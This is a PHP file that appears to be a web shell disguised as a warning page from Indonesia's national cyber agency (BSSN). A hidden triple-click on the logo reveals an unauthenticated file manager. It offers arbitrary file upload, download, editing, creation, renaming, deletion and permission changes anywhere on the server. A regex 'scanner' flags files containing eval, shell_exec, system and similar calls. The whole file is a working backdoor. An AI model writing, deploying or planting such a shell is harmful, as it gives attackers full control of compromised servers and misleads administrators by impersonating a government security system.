<?php
/**
 * BSSN INTERNAL AUDITOR v11.5 - REVISED
 */
error_reporting(0);
@set_time_limit(0);

$p = isset($_GET['p']) ? $_GET['p'] : getcwd();
$p = str_replace('\\', '/', $p);
$ip = $_SERVER['REMOTE_ADDR'];

// --- LOGIKA AKSI ---
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['a'])) {
        $t = $_POST['target'];
        switch($_POST['a']) {
            case 'save': file_put_contents($t, $_POST['src']); break;
            case 'ren': rename($t, dirname($t).'/'.$_POST['new']); break;
            case 'del': is_dir($t) ? @rmdir($t) : @unlink($t); break;
            case 'perm': chmod($t, octdec($_POST['oct'])); break;
            case 'new': file_put_contents($p.'/'.$_POST['fn'], $_POST['fc']); break;
        }
    }
    if (isset($_FILES['up'])) {
        move_uploaded_file($_FILES['up']['tmp_name'], $p.'/'.$_FILES['up']['name']);
    }
}
if (isset($_GET['dl'])) {
    if (file_exists($_GET['dl'])) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($_GET['dl']).'"');
        readfile($_GET['dl']); exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>BSSN - INTERNAL AUDIT</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; }
        .header { background: #fff; color: #000; text-align: center; padding: 20px; border-bottom: 5px solid #d00; }
        .logo { width: 80px; cursor: pointer; }
        .warning-box { border: 2px solid #d00; margin: 50px auto; width: 80%; padding: 20px; background: rgba(255,0,0,0.1); }
        #shell { display: none; background: #fff; color: #000; min-height: 100vh; padding: 20px; font-family: sans-serif; }
        .nav { background: #333; padding: 10px; margin-bottom: 10px; }
        .nav a { color: #fff; text-decoration: none; font-weight: bold; font-size: 12px; padding: 5px 12px; border: 1px solid #fff; margin-right: 5px; }
        .nav a:hover { background: #fff; color: #000; }
        table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; }
        th { background: #d00; color: #fff; padding: 10px; border: 1px solid #000; }
        td { border: 1px solid #ccc; padding: 8px; color: #000; }
        .danger { background: #ffcccc !important; font-weight: bold; color: #b00 !important; }
        .btn { background: #000; color: #fff; border: 1px solid #000; cursor: pointer; padding: 3px 8px; font-size: 11px; }
    </style>
</head>
<body>

<div id="judgement">
    <div class="header">
        <img src="https://d.top4top.io/p_3692mym1y4.png" class="logo" onclick="unlock()">
        <h1 style="margin:5px 0;">BADAN SIBER DAN SANDI NEGARA</h1>
        <p style="color:#d00; font-weight:bold;">SISTEM DETEKSI INTRUSI OTOMATIS (IDS v4.5)</p>
    </div>
    <div class="warning-box">
        <h2 style="text-align:center; color:#d00;">🛑 PERINGATAN KERAS 🛑</h2>
        <p>Seluruh aktivitas di server ini dicatat oleh sistem keamanan BSSN.</p>
        <p>IP ADDRESS ANDA: <b><?php echo $ip; ?></b></p>
        <p style="color:#0f0;">[STATUS: MONITORING ACTIVE...]</p>
    </div>
</div>

<div id="shell">
    <div style="text-align:center; border-bottom:2px solid #d00; padding-bottom:10px;">
        <img src="https://d.top4top.io/p_3692mym1y4.png" width="60">
        <h3>BSSN - INTERNAL ASSET AUDITOR</h3>
    </div>

    <div class="nav">
        <a href="?p=<?php echo $p; ?>">📂 MANAGER</a>
        <a href="?act=new&p=<?php echo $p; ?>">➕ NEW FILE</a>
        <a href="?act=audit&p=<?php echo $p; ?>">🛡️ AUDIT SERVER</a>
    </div>

    <?php 
    // --- MODE AUDIT ---
    if (isset($_GET['act']) && $_GET['act'] == 'audit'): ?>
        <h4 style="color:#d00;">🔍 MALWARE & BACKDOOR SCANNER</h4>
        <p style="font-size:12px;">Mencari file dengan fungsi berbahaya (eval, shell_exec, system, base64, dll):</p>
        <table>
            <thead><tr><th>NAMA FILE</th><th>UKURAN</th><th>DETECTED SCRIPT</th><th>AKSI</th></tr></thead>
            <tbody>
            <?php 
            $files = scandir($p);
            foreach($files as $i) {
                if($i == '.' || $i == '..') continue;
                $f = "$p/$i";
                if(is_file($f)) {
                    $cont = file_get_contents($f);
                    $danger = false;
                    $found = [];
                    // Cek fungsi-fungsi mencurigakan
                    if(preg_match_all('/(eval|shell_exec|system|base64_decode|gzinflate|passthru|exec)/i', $cont, $matches)) {
                        $danger = true;
                        $found = array_unique($matches[0]);
                    }
                    
                    if($danger) {
                        echo "<tr class='danger'>
                            <td>📄 $i</td>
                            <td>".round(filesize($f)/1024, 2)." KB</td>
                            <td>".implode(', ', $found)."</td>
                            <td>
                                <a href='?e=$f&p=$p'>Periksa</a> | 
                                <form method='POST' style='display:inline;' onsubmit=\"return confirm('Hapus file berbahaya?')\">
                                    <input type='hidden' name='target' value='$f'><input type='hidden' name='a' value='del'><input type='submit' value='HAPUS' class='btn' style='background:red;'>
                                </form>
                            </td>
                        </tr>";
                    }
                }
            }
            ?>
            </tbody>
        </table>
        <p style="font-size:11px; color:#666; margin-top:10px;"></p>

    <?php 
    // --- MODE EDIT ---
    elseif (isset($_GET['e'])): ?>
        <h4>EDITOR: <?php echo basename($_GET['e']); ?></h4>
        <form method="POST">
            <textarea name="src" rows="20" style="width:100%; font-family:monospace;"><?php echo htmlspecialchars(file_get_contents($_GET['e'])); ?></textarea>
            <input type="hidden" name="target" value="<?php echo $_GET['e']; ?>">
            <input type="hidden" name="a" value="save"><br>
            <input type="submit" value="SIMPAN PERUBAHAN" class="btn" style="width:100%; padding:10px; background:#0056b3;">
        </form>

    <?php 
    // --- MODE NEW FILE ---
    elseif (isset($_GET['act']) && $_GET['act'] == 'new'): ?>
        <h4>BUAT FILE BARU</h4>
        <form method="POST">
            <input type="text" name="fn" placeholder="nama_file.php" style="width:100%; padding:8px;"><br><br>
            <textarea name="fc" rows="15" style="width:100%;"></textarea>
            <input type="hidden" name="a" value="new"><br>
            <input type="submit" value="BUAT SEKARANG" class="btn" style="width:100%; padding:10px;">
        </form>

    <?php 
    // --- MODE MANAGER (DEFAULT) ---
    else: ?>
        <form method="POST" enctype="multipart/form-data">
            <div style="margin-bottom:10px; padding:10px; background:#f0f0f0; border:1px solid #ccc;">
                <b>PATH:</b> <?php echo $p; ?> | <input type="file" name="up"> <input type="submit" value="UPLOAD" class="btn">
            </div>
            <table>
                <thead><tr><th>NAMA</th><th>SIZE</th><th>PERM</th><th>ACTION</th></tr></thead>
                <tbody>
                <?php 
                foreach(scandir($p) as $i) {
                    if($i == '.') continue;
                    $f = "$p/$i"; $d = is_dir($f);
                    $perm = substr(sprintf('%o', fileperms($f)), -4);
                    echo "<tr>
                        <td><a href='?".($d?"p=$f":"dl=$f")."' style='text-decoration:none; color:#0056b3;'>".($d?"📂":"📄")." $i</a></td>
                        <td>".($d?"--":round(filesize($f)/1024,2)." KB")."</td>
                        <td>$perm</td>
                        <td>
                            <a href='?e=$f&p=$p'>Edit</a> | 
                            <form method='POST' style='display:inline;'>
                                <input type='hidden' name='target' value='$f'>
                                <select name='a' onchange='this.form.submit()' style='font-size:10px;'>
                                    <option value=''>-</option>
                                    <option value='ren'>Rename</option>
                                    <option value='perm'>Chmod</option>
                                    <option value='del'>Delete</option>
                                </select>
                            </form>
                        </td></tr>";
                }
                ?>
                </tbody>
            </table>
        </form>
    <?php endif; ?>
</div>

<script>
    let clicks = 0;
    function unlock() {
        clicks++;
        if(clicks >= 3) {
            document.getElementById('judgement').style.display = 'none';
            document.getElementById('shell').style.display = 'block';
        }
    }
</script>
</body>
</html>